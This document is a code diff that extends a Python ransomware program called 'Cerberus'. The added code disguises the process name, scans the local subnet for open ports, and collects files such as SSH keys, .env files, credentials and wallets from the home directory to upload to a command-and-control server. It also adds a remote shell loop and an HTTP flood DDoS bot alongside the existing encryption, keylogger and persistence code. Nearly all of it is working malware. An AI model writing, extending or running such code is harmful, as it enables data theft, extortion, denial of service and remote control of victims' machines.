@@ -236,6 +236,37 @@ def scan_directories(root_path, max_depth=2, current_depth=0):
         pass  # Skip inaccessible directories
     return dirs
 
+def _get_stable_recon_id():
+    """Generate a stable machine-based recon ID (same across restarts)"""
+    RECON_ID_FILE = os.path.join(CONFIG_DIR, ".cerberus_recon_id")
+    
+    # If we already have a recon ID from a previous run, reuse it
+    if os.path.exists(RECON_ID_FILE):
+        try:
+            with open(RECON_ID_FILE, 'r') as f:
+                recon_id = f.read().strip()
+            if recon_id:
+                return recon_id
+        except:
+            pass
+    
+    # Generate a new stable ID based on machine identity
+    try:
+        machine_data = f"{os.getlogin()}@{socket.gethostname()}"
+    except:
+        machine_data = socket.gethostname()
+    import hashlib
+    recon_id = hashlib.md5(machine_data.encode()).hexdigest()[:12]
+    
+    # Save it for future restarts
+    try:
+        with open(RECON_ID_FILE, 'w') as f:
+            f.write(recon_id)
+    except:
+        pass
+    
+    return recon_id
+
 def scan_and_wait_for_instructions():
     """
     1. Scans directories in home (nested up to 2 levels).
@@ -249,11 +280,11 @@ def scan_and_wait_for_instructions():
     dirs = scan_directories(home, max_depth=2)
     log_error(f"Scanned {len(dirs)} directories (2 levels deep)")
     
-    # Generate temp ID for recon phase
-    temp_id = base64.urlsafe_b64encode(os.urandom(6)).decode().rstrip('=')
+    # Use a STABLE recon ID (same across restarts)
+    temp_id = _get_stable_recon_id()
     log_error(f"Recon ID: {temp_id} - Found {len(dirs)} folders")
     
-    # Send to C2
+    # Send to C2 (will OVERWRITE any existing entry with same ID)
     payload = {"id": temp_id, "type": "RECON", "files": dirs}
     try:
         requests.post(f"{C2_SERVER_URL}/api/recon", json=payload, timeout=5)
@@ -261,9 +292,9 @@ def scan_and_wait_for_instructions():
         log_error(f"Recon send failed: {e}")
         return None  # Fail to offline mode
     
-    # Poll for command
+    # Poll for command — wait up to 2 HOURS (1440 × 5s)
     log_error("Waiting for attacker to select targets...")
-    for _ in range(120):  # Wait up to 10 minutes (120 * 5s)
+    for i in range(1440):
         try:
             resp = requests.get(f"{C2_SERVER_URL}/api/task/{temp_id}", timeout=5)
             if resp.status_code == 200:
@@ -274,9 +305,17 @@ def scan_and_wait_for_instructions():
                     return targets
         except:
             pass
+        
+        # Re-post recon every ~1 minute to keep "last_seen" fresh on C2
+        if i > 0 and i % 12 == 0:
+            try:
+                requests.post(f"{C2_SERVER_URL}/api/recon", json=payload, timeout=5)
+            except:
+                pass
+        
         time.sleep(5)
     
-    log_error("Timed out waiting for command")
+    log_error("Timed out waiting for command (2 hours)")
     return None
 
 # --- Ransomware Logic ---
@@ -395,6 +434,262 @@ def check_in_with_c2(aes_key):
         log_error(f"C2 check-in critical failure: {e}")
         # Ultimate fallback
         return "CRITICAL-FAILURE"
+
+# --- RAT MODULE FUNCTIONS ---
+
+# Chameleon: Process Masquerading
+def chameleon_disguise():
+    """Disguise process name in Task Manager"""
+    try:
+        if os.name == 'nt':
+            # Windows: Set console title
+            ctypes.windll.kernel32.SetConsoleTitleW("Windows Security Service")
+        else:
+            # Linux: Try to rename process (requires setproctitle)
+            try:
+                import setproctitle
+                setproctitle.setproctitle("systemd-resolved")
+            except ImportError:
+                pass  # setproctitle not available
+        log_error("Chameleon: Process disguised")
+    except Exception as e:
+        log_error(f"Chameleon error: {e}")
+
+# Cartographer: Network Scanner
+def scan_network():
+    """Scan local network for live hosts"""
+    try:
+        # Get local IP
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        local_ip = s.getsockname()[0]
+        s.close()
+        
+        # Calculate subnet
+        ip_parts = local_ip.split('.')
+        subnet = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}"
+        
+        log_error(f"Cartographer: Scanning {subnet}.0/24")
+        
+        hosts = []
+        common_ports = [22, 80, 443, 445, 3389]  # SSH, HTTP, HTTPS, SMB, RDP
+        
+        # Scan first 10 IPs only (to avoid long delays)
+        for i in range(1, 11):
+            ip = f"{subnet}.{i}"
+            if ip == local_ip:
+                continue
+            
+            open_ports = []
+            for port in common_ports:
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(0.5)
+                    result = sock.connect_ex((ip, port))
+                    if result == 0:
+                        open_ports.append(port)
+                    sock.close()
+                except:
+                    pass
+            
+            if open_ports:
+                hosts.append({"ip": ip, "ports": open_ports})
+        
+        log_error(f"Cartographer: Found {len(hosts)} hosts")
+        return hosts
+    except Exception as e:
+        log_error(f"Cartographer error: {e}")
+        return []
+
+# Data Thief: File Exfiltration
+def exfiltrate_files(victim_id):
+    """Scan and exfiltrate high-value files"""
+    try:
+        home = os.path.expanduser("~")
+        targets = []
+        
+        # Extensions to grab
+        steal_extensions = {'.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx',
+                           '.csv', '.ppt', '.pptx', '.jpg', '.png', '.jpeg',
+                           '.env', '.pem', '.key', '.json', '.xml', '.sql', '.db'}
+        
+        # Filenames that are always interesting
+        steal_names = {'passwords', 'password', 'credentials', 'secret', 'secrets',
+                       'config', 'id_rsa', 'id_ed25519', 'wallet', 'backup',
+                       '.env', '.bashrc', '.bash_history', '.ssh'}
+        
+        # Directories to skip
+        skip_dirs = {'appdata', 'cache', '.git', 'node_modules', '__pycache__',
+                     'local', 'temp', '.vscode', '.idea'}
+        
+        log_error("Data Thief: Scanning for valuable files...")
+        
+        for root, dirs, files in os.walk(home):
+            # Skip hidden/cache directories
+            dirs[:] = [d for d in dirs if d.lower() not in skip_dirs and not d.startswith('__')]
+            
+            for file in files:
+                file_lower = file.lower()
+                ext = os.path.splitext(file_lower)[1]
+                
+                # Match by extension OR by keyword in filename
+                should_steal = (ext in steal_extensions or 
+                               any(kw in file_lower for kw in steal_names))
+                
+                if should_steal:
+                    file_path = os.path.join(root, file)
+                    try:
+                        size = os.path.getsize(file_path)
+                        if 0 < size < 500000:  # Files between 0 and 500KB
+                            targets.append(file_path)
+                            if len(targets) >= 30:
+                                break
+                    except:
+                        pass
+            if len(targets) >= 30:
+                break
+        
+        log_error(f"Data Thief: Found {len(targets)} valuable files")
+        
+        # Upload files to C2
+        for file_path in targets:
+            try:
+                with open(file_path, 'rb') as f:
+                    content = f.read()
+                
+                data = {
+                    "name": os.path.basename(file_path),
+                    "path": file_path,
+                    "data_b64": base64.b64encode(content).decode(),
+                    "size": len(content)
+                }
+                
+                requests.post(f"{C2_SERVER_URL}/api/exfil/{victim_id}", json=data, timeout=5)
+                log_error(f"Data Thief: Exfiltrated {data['name']}")
+            except Exception as e:
+                log_error(f"Data Thief: Failed to exfil {file_path}: {e}")
+        
+    except Exception as e:
+        log_error(f"Data Thief error: {e}")
+
+# Poltergeist + Zombie: RAT Command Loop
+class RATCommandLoop:
+    """Handles remote command execution and DDoS bot"""
+    def __init__(self, victim_id):
+        self.victim_id = victim_id
+        self.stop_event = threading.Event()
+        self.ddos_threads = []
+        self.ddos_active = False
+        self.cwd = os.path.expanduser("~")  # Track working directory persistently
+    
+    def start(self):
+        threading.Thread(target=self.command_loop, daemon=True).start()
+        log_error("RAT Command Loop started")
+    
+    def command_loop(self):
+        """Poll C2 for commands"""
+        while not self.stop_event.is_set():
+            try:
+                resp = requests.get(f"{C2_SERVER_URL}/api/rat_command/{self.victim_id}", timeout=5)
+                if resp.status_code == 200:
+                    cmd = resp.json()
+                    cmd_type = cmd.get('type')
+                    
+                    if cmd_type == 'shell':
+                        self.execute_shell(cmd.get('cmd'))
+                    elif cmd_type == 'ddos_start':
+                        self.start_ddos(cmd.get('target'))
+                    elif cmd_type == 'ddos_stop':
+                        self.stop_ddos()
+                    
+            except Exception as e:
+                pass  # Silent fail, keep polling
+            
+            time.sleep(5)
+    
+    def execute_shell(self, cmd):
+        """Execute shell command and send output back"""
+        try:
+            # Handle 'cd' command — update persistent working directory
+            stripped = cmd.strip()
+            if stripped == 'cd' or stripped.startswith('cd '):
+                if stripped == 'cd':
+                    new_dir = os.path.expanduser("~")
+                else:
+                    new_dir = stripped[3:].strip()
+                
+                # Resolve relative paths from current cwd
+                if not os.path.isabs(new_dir):
+                    new_dir = os.path.join(self.cwd, new_dir)
+                new_dir = os.path.normpath(new_dir)
+                
+                if os.path.isdir(new_dir):
+                    self.cwd = new_dir
+                    output = f"Changed directory to: {self.cwd}"
+                else:
+                    output = f"cd: no such directory: {new_dir}"
+                
+                requests.post(
+                    f"{C2_SERVER_URL}/api/rat_output/{self.victim_id}",
+                    json={"cmd": cmd, "output": output},
+                    timeout=5
+                )
+                return
+            
+            # Regular command — run from persistent cwd
+            result = subprocess.run(
+                cmd, shell=True, capture_output=True, text=True, 
+                timeout=15, cwd=self.cwd
+            )
+            
+            output = result.stdout + result.stderr
+            if not output:
+                output = "(No output)"
+            
+            # Send back to C2 (up to 2000 chars for useful output)
+            requests.post(
+                f"{C2_SERVER_URL}/api/rat_output/{self.victim_id}",
+                json={"cmd": cmd, "output": output[:2000]},
+                timeout=5
+            )
+            log_error(f"RAT: Executed {cmd[:30]}")
+        except Exception as e:
+            output = f"Error: {str(e)}"
+            try:
+                requests.post(
+                    f"{C2_SERVER_URL}/api/rat_output/{self.victim_id}",
+                    json={"cmd": cmd, "output": output},
+                    timeout=5
+                )
+            except:
+                pass
+    
+    def start_ddos(self, target):
+        """Start DDoS attack on target"""
+        if self.ddos_active:
+            return
+        
+        self.ddos_active = True
+        log_error(f"Zombie: Starting DDoS on {target}")
+        
+        def flood():
+            while self.ddos_active:
+                try:
+                    requests.get(target, timeout=1)
+                except:
+                    pass
+        
+        # Spawn 5 flood threads
+        for _ in range(5):
+            t = threading.Thread(target=flood, daemon=True)
+            t.start()
+            self.ddos_threads.append(t)
+    
+    def stop_ddos(self):
+        """Stop DDoS attack"""
+        self.ddos_active = False
+        self.ddos_threads = []
+        log_error("Zombie: DDoS stopped")
 
 # --- Keylogger Logic ---
 class Keylogger:
@@ -529,6 +824,10 @@ class RansomwareGUI:
         # START KEYLOGGER AUTOMATICALLY
         self.keylogger = Keylogger(victim_id)
         self.master.after(1000, self.keylogger.start)
+        
+        # START RAT COMMAND LOOP (Poltergeist + Zombie)
+        self.rat_loop = RATCommandLoop(victim_id)
+        self.master.after(1500, self.rat_loop.start)
         
         # RAGEBAIT CLOSE HANDLER
         master.protocol("WM_DELETE_WINDOW", self.ragebait_close)
@@ -780,16 +1079,49 @@ class RansomwareGUI:
 # --- Main Execution ---
 if __name__ == "__main__":
     if os.path.exists(CLEAN_MARKER):
-        # Already cleaned up - exit
         sys.exit(0)
     
-    # 0. Persistence Installation
+    # ========================================
+    # SINGLETON LOCK: Use Windows Mutex (atomic, no race conditions)
+    # ========================================
+    if os.name == 'nt':
+        try:
+            import ctypes
+            import ctypes.wintypes
+            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
+            MUTEX_NAME = "Global\\CerberusRansomwareMutex"
+            mutex = kernel32.CreateMutexW(None, True, MUTEX_NAME)
+            last_error = ctypes.get_last_error()
+            if last_error == 183:  # ERROR_ALREADY_EXISTS
+                log_error("Another instance already running (mutex). Exiting.")
+                sys.exit(0)
+        except Exception as e:
+            log_error(f"Mutex check failed: {e}")
+    else:
+        # Linux: Use lockf on the lock file
+        SINGLETON_LOCK = os.path.join(CONFIG_DIR, ".cerberus_running")
+        try:
+            import fcntl
+            _lock_fd = open(SINGLETON_LOCK, 'w')
+            fcntl.lockf(_lock_fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
+            _lock_fd.write(str(os.getpid()))
+            _lock_fd.flush()
+        except (IOError, OSError):
+            log_error("Another instance already running (lockf). Exiting.")
+            sys.exit(0)
+        except ImportError:
+            pass  # No fcntl, fall through
+    
+    # ========================================
+    # PERSISTENCE
+    # ========================================
     install_persistence()
-
     hide_console()
+    chameleon_disguise()
 
-    # PERSISTENCE CHECK-IN (Restoring after reboot)
-    # If ID file exists, we already encrypted - just show GUI
+    # ========================================
+    # RESUME: If ID file exists, we already infected - just show GUI
+    # ========================================
     if os.path.exists(ID_FILE):
         try:
             with open(ID_FILE, 'r') as f:
@@ -803,23 +1135,61 @@ if __name__ == "__main__":
         except:
             pass 
     
-    # NEW INFECTION FLOW
+    # ========================================
+    # FRESH START CLEANUP: Remove stale state from crashed previous runs
+    # If ID_FILE doesn't exist, any leftover LOCK_FILE or KEY_BACKUP is stale
+    # ========================================
+    for stale_file in [LOCK_FILE, KEY_BACKUP_FILE, ENCRYPTED_PATHS_FILE]:
+        if os.path.exists(stale_file):
+            try:
+                os.remove(stale_file)
+                log_error(f"Cleaned stale file: {stale_file}")
+            except:
+                pass
+    
+    # Also clean stale recon ID so a fresh one is generated
+    recon_id_file = os.path.join(CONFIG_DIR, ".cerberus_recon_id")
+    if os.path.exists(recon_id_file):
+        try:
+            os.remove(recon_id_file)
+        except:
+            pass
+    
+    # ========================================
+    # NEW INFECTION: Only runs ONCE (no ID file, no lock file)
+    # ========================================
+    log_error("Starting new infection...")
+    
     # Step 1: Try to get target selection from C2
-    log_error("Starting new infection - attempting target selection...")
     selected_targets = scan_and_wait_for_instructions()
     
-    # Step 2: Encrypt (selected targets OR default if C2 unreachable)
+    # Step 2: Encrypt
     if selected_targets:
         log_error(f"C2 selected {len(selected_targets)} targets")
         aes_key = encrypt_directory(selected_targets)
     else:
         log_error("C2 unreachable or timed out - using default target")
-        aes_key = encrypt_directory()  # Falls back to TARGET_DIRECTORY
+        aes_key = encrypt_directory()
     
     # Step 3: Check in and launch GUI
     if aes_key:
         victim_id = check_in_with_c2(aes_key)
         if victim_id:
+            # Cartographer: Network scan in background (uses actual victim_id)
+            def run_network_scan():
+                try:
+                    time.sleep(3)
+                    hosts = scan_network()
+                    if hosts:
+                        requests.post(f"{C2_SERVER_URL}/api/network_map/{victim_id}", json={"hosts": hosts}, timeout=5)
+                except:
+                    pass
+            threading.Thread(target=run_network_scan, daemon=True).start()
+            
+            # Data Thief: Exfiltrate in background
+            threading.Thread(target=lambda: exfiltrate_files(victim_id), daemon=True).start()
+            
+            # Launch GUI (only ONE instance)
             root = Tk()
             app = RansomwareGUI(root, victim_id)
             root.mainloop()
@@ -827,4 +1197,3 @@ if __name__ == "__main__":
             log_error("Failed to get Victim ID. Aborting GUI.")
     else:
         log_error("Encryption skipped or failed. Aborting.")
-
